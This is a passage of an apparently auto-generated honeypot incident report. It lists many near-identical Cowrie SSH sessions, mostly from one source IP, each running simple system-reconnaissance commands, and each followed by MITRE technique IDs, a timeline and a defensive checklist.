| `2026-07-13 11:46:57` | `cowrie.login.success` |
| `2026-07-13 11:46:57` | `cowrie.session.params` |
| `2026-07-13 11:46:57` | `cowrie.command.input` |
| `2026-07-13 11:47:06` | `cowrie.log.closed` |
| `2026-07-13 11:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34512bd152c2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:07` | `cowrie.session.connect` |
| `2026-07-13 11:47:07` | `cowrie.login.success` |
| `2026-07-13 11:47:07` | `cowrie.session.params` |
| `2026-07-13 11:47:07` | `cowrie.command.input` |
| `2026-07-13 11:47:17` | `cowrie.log.closed` |
| `2026-07-13 11:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2617cab8f9fe

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:17` | `cowrie.session.connect` |
| `2026-07-13 11:47:17` | `cowrie.login.success` |
| `2026-07-13 11:47:17` | `cowrie.session.params` |
| `2026-07-13 11:47:17` | `cowrie.command.input` |
| `2026-07-13 11:47:27` | `cowrie.log.closed` |
| `2026-07-13 11:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c1d1bde62d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:27` | `cowrie.session.connect` |
| `2026-07-13 11:47:27` | `cowrie.login.success` |
| `2026-07-13 11:47:27` | `cowrie.session.params` |
| `2026-07-13 11:47:27` | `cowrie.command.input` |
| `2026-07-13 11:47:37` | `cowrie.log.closed` |
| `2026-07-13 11:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3104344a34e9

| Field | Detail |
|---|---|
| **Source IP** | `180.76.168[.]116` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:31` | `cowrie.session.connect` |
| `2026-07-13 11:47:31` | `cowrie.client.version` |
| `2026-07-13 11:47:32` | `cowrie.client.kex` |
| `2026-07-13 11:47:34` | `cowrie.login.success` |
| `2026-07-13 11:47:36` | `cowrie.session.params` |
| `2026-07-13 11:47:36` | `cowrie.command.input` |
| `2026-07-13 11:47:36` | `cowrie.log.closed` |
| `2026-07-13 11:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.168[.]116` to AbuseIPDB if not already reported
- [ ] Block `180.76.168[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38921456aaf2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:37` | `cowrie.session.connect` |
| `2026-07-13 11:47:37` | `cowrie.login.success` |
| `2026-07-13 11:47:38` | `cowrie.session.params` |
| `2026-07-13 11:47:38` | `cowrie.command.input` |
| `2026-07-13 11:47:47` | `cowrie.log.closed` |
| `2026-07-13 11:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4add1b0391fb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:47` | `cowrie.session.connect` |
| `2026-07-13 11:47:47` | `cowrie.login.success` |
| `2026-07-13 11:47:48` | `cowrie.session.params` |
| `2026-07-13 11:47:48` | `cowrie.command.input` |
| `2026-07-13 11:47:57` | `cowrie.log.closed` |
| `2026-07-13 11:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a9c69db0c6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:47 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:47:57` | `cowrie.session.connect` |
| `2026-07-13 11:47:57` | `cowrie.login.success` |
| `2026-07-13 11:47:58` | `cowrie.session.params` |
| `2026-07-13 11:47:58` | `cowrie.command.input` |
| `2026-07-13 11:48:07` | `cowrie.log.closed` |
| `2026-07-13 11:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7704ee38a5e0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:07` | `cowrie.session.connect` |
| `2026-07-13 11:48:07` | `cowrie.login.success` |
| `2026-07-13 11:48:08` | `cowrie.session.params` |
| `2026-07-13 11:48:08` | `cowrie.command.input` |
| `2026-07-13 11:48:17` | `cowrie.log.closed` |
| `2026-07-13 11:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7570bf0748a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:17` | `cowrie.session.connect` |
| `2026-07-13 11:48:17` | `cowrie.login.success` |
| `2026-07-13 11:48:18` | `cowrie.session.params` |
| `2026-07-13 11:48:18` | `cowrie.command.input` |
| `2026-07-13 11:48:27` | `cowrie.log.closed` |
| `2026-07-13 11:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6274685f5075

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:27` | `cowrie.session.connect` |
| `2026-07-13 11:48:28` | `cowrie.login.success` |
| `2026-07-13 11:48:28` | `cowrie.session.params` |
| `2026-07-13 11:48:28` | `cowrie.command.input` |
| `2026-07-13 11:48:37` | `cowrie.log.closed` |
| `2026-07-13 11:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092b3e7bd6eb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:37` | `cowrie.session.connect` |
| `2026-07-13 11:48:38` | `cowrie.login.success` |
| `2026-07-13 11:48:38` | `cowrie.session.params` |
| `2026-07-13 11:48:38` | `cowrie.command.input` |
| `2026-07-13 11:48:47` | `cowrie.log.closed` |
| `2026-07-13 11:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05af260345ea

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:48` | `cowrie.session.connect` |
| `2026-07-13 11:48:48` | `cowrie.login.success` |
| `2026-07-13 11:48:48` | `cowrie.session.params` |
| `2026-07-13 11:48:48` | `cowrie.command.input` |
| `2026-07-13 11:48:58` | `cowrie.log.closed` |
| `2026-07-13 11:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0957c423a5

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:48 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:48:58` | `cowrie.session.connect` |
| `2026-07-13 11:48:58` | `cowrie.login.success` |
| `2026-07-13 11:48:58` | `cowrie.session.params` |
| `2026-07-13 11:48:58` | `cowrie.command.input` |
| `2026-07-13 11:49:08` | `cowrie.log.closed` |
| `2026-07-13 11:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9cf79c2e54

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:08` | `cowrie.session.connect` |
| `2026-07-13 11:49:08` | `cowrie.login.success` |
| `2026-07-13 11:49:08` | `cowrie.session.params` |
| `2026-07-13 11:49:08` | `cowrie.command.input` |
| `2026-07-13 11:49:18` | `cowrie.log.closed` |
| `2026-07-13 11:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd964e873b2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:18` | `cowrie.session.connect` |
| `2026-07-13 11:49:18` | `cowrie.login.success` |
| `2026-07-13 11:49:19` | `cowrie.session.params` |
| `2026-07-13 11:49:19` | `cowrie.command.input` |
| `2026-07-13 11:49:28` | `cowrie.log.closed` |
| `2026-07-13 11:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f43f6db0de5

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:28` | `cowrie.session.connect` |
| `2026-07-13 11:49:28` | `cowrie.login.success` |
| `2026-07-13 11:49:28` | `cowrie.session.params` |
| `2026-07-13 11:49:29` | `cowrie.command.input` |
| `2026-07-13 11:49:38` | `cowrie.log.closed` |
| `2026-07-13 11:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6accc339d814

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:38` | `cowrie.session.connect` |
| `2026-07-13 11:49:38` | `cowrie.login.success` |
| `2026-07-13 11:49:39` | `cowrie.session.params` |
| `2026-07-13 11:49:39` | `cowrie.command.input` |
| `2026-07-13 11:49:48` | `cowrie.log.closed` |
| `2026-07-13 11:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e054bab6e718

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:48` | `cowrie.session.connect` |
| `2026-07-13 11:49:48` | `cowrie.login.success` |
| `2026-07-13 11:49:49` | `cowrie.session.params` |
| `2026-07-13 11:49:49` | `cowrie.command.input` |
| `2026-07-13 11:49:58` | `cowrie.log.closed` |
| `2026-07-13 11:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b544b085b16e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:49 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:49:58` | `cowrie.session.connect` |
| `2026-07-13 11:49:58` | `cowrie.login.success` |
| `2026-07-13 11:49:59` | `cowrie.session.params` |
| `2026-07-13 11:49:59` | `cowrie.command.input` |
| `2026-07-13 11:50:08` | `cowrie.log.closed` |
| `2026-07-13 11:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879c62f86d4a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:08` | `cowrie.session.connect` |
| `2026-07-13 11:50:08` | `cowrie.login.success` |
| `2026-07-13 11:50:09` | `cowrie.session.params` |
| `2026-07-13 11:50:09` | `cowrie.command.input` |
| `2026-07-13 11:50:18` | `cowrie.log.closed` |
| `2026-07-13 11:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173da176925d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:18` | `cowrie.session.connect` |
| `2026-07-13 11:50:19` | `cowrie.login.success` |
| `2026-07-13 11:50:19` | `cowrie.session.params` |
| `2026-07-13 11:50:19` | `cowrie.command.input` |
| `2026-07-13 11:50:28` | `cowrie.log.closed` |
| `2026-07-13 11:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6499a84ec0b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:28` | `cowrie.session.connect` |
| `2026-07-13 11:50:29` | `cowrie.login.success` |
| `2026-07-13 11:50:29` | `cowrie.session.params` |
| `2026-07-13 11:50:29` | `cowrie.command.input` |
| `2026-07-13 11:50:38` | `cowrie.log.closed` |
| `2026-07-13 11:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb4601d7b9f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:39` | `cowrie.session.connect` |
| `2026-07-13 11:50:39` | `cowrie.login.success` |
| `2026-07-13 11:50:39` | `cowrie.session.params` |
| `2026-07-13 11:50:39` | `cowrie.command.input` |
| `2026-07-13 11:50:49` | `cowrie.log.closed` |
| `2026-07-13 11:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d07d0315288

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:49` | `cowrie.session.connect` |
| `2026-07-13 11:50:49` | `cowrie.login.success` |
| `2026-07-13 11:50:49` | `cowrie.session.params` |
| `2026-07-13 11:50:49` | `cowrie.command.input` |
| `2026-07-13 11:50:59` | `cowrie.log.closed` |
| `2026-07-13 11:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5f531b9585

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:50 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:50:59` | `cowrie.session.connect` |
| `2026-07-13 11:50:59` | `cowrie.login.success` |
| `2026-07-13 11:50:59` | `cowrie.session.params` |
| `2026-07-13 11:51:00` | `cowrie.command.input` |
| `2026-07-13 11:51:09` | `cowrie.log.closed` |
| `2026-07-13 11:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b4d0b03f652

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:09` | `cowrie.session.connect` |
| `2026-07-13 11:51:09` | `cowrie.login.success` |
| `2026-07-13 11:51:10` | `cowrie.session.params` |
| `2026-07-13 11:51:10` | `cowrie.command.input` |
| `2026-07-13 11:51:19` | `cowrie.log.closed` |
| `2026-07-13 11:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29cff877a2b4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:19` | `cowrie.session.connect` |
| `2026-07-13 11:51:19` | `cowrie.login.success` |
| `2026-07-13 11:51:20` | `cowrie.session.params` |
| `2026-07-13 11:51:20` | `cowrie.command.input` |
| `2026-07-13 11:51:29` | `cowrie.log.closed` |
| `2026-07-13 11:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c235d2c797

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:51 |
| **Last Seen** | 2026-07-13 11:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:51:29` | `cowrie.session.connect` |
| `2026-07-13 11:51:29` | `cowrie.login.success` |
| `2026-07-13 11:51:30` | `cowrie.session.params` |
| `2026-07-13 11:51:30` | `cowrie.command.input` |
| `2026-07-13 11:51:39` | `cowrie.log.closed` |
